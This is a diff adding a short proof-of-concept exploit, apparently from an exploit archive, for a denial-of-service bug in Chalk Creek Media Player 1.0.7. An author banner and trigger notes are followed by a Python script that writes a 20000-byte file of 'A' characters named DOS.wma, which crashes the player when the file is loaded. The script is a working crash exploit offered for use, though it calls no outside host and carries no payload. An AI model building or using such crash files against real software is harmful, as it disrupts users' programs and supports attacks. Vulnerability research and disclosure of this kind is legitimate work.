@@ -1,0 +1,29 @@
+# Exploit Title: Chalk Creek Media Player 1.0.7 .mp3 and .wma  DOS 
+# Date: September 16 2010
+# Author: Carlos Mario Penagos Hollmann 
+# Software Link: http://download.cnet.com/3001-2139_4-10526196.html?spi=a1e3adfe2f3af811074a43111c901f6c
+# Version: 1.0.7
+# Tested on: Windows xp sp3 running on VMware Fusion 3.1
+# CVE : 
+
+
+#    ________  _    _________   ____ __ _____   ________
+#   / ____/ / | |  / / ____/ | / / //_//  _/ | / / ____/
+#  / __/ / /  | | / / __/ /  |/ / ,<   / //  |/ / / __ 
+# / /___/ /___| |/ / /___/ /|  / /| |_/ // /|  / /_/ / 
+#/_____/_____/|___/_____/_/ |_/_/ |_/___/_/ |_/\____/  
+
+# COLOMBIA presents.............
+#
+#Carlos Mario Penagos Hollmann A.K.A Elvenking  shogilord@gmail.com
+#	
+#Trigger:Launch app, File Selection--->Add individual music files..booooom
+#works with .wma and .mp3
+#
+#PEACE TO COLOMBIA no more WAR!!
+#
+
+buff = "\x41" * 20000
+magic = open("DOS.wma","w")
+magic.write(buff)
+magic.close()
